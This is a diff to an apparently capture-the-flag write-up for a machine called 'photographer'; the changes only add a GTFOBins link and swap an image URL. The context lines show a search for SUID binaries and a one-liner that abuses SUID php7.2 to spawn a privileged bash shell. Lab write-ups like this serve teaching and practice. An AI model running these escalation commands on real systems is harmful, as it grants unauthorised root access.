@@ -382,9 +382,9 @@ find / -perm -u=s -type f 2>/dev/null
 
 We can now use on of these files to escalate our privilege.
 
-Let's go to GTFOBins to search for an exploit for the `php` utility.
+Let's go to [GTFOBins](https://gtfobins.github.io/gtfobins/php/#suid) to search for an exploit for the `php` utility.
 
-![11](https://github.com/Kunull/Write-ups/assets/110326359/574dcd86-8702-4397-864e-50f8d0debcdc)
+![11](https://github.com/user-attachments/assets/910b21a9-bfea-4a42-a7f5-805e030f4e32)
 
 ```
 www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
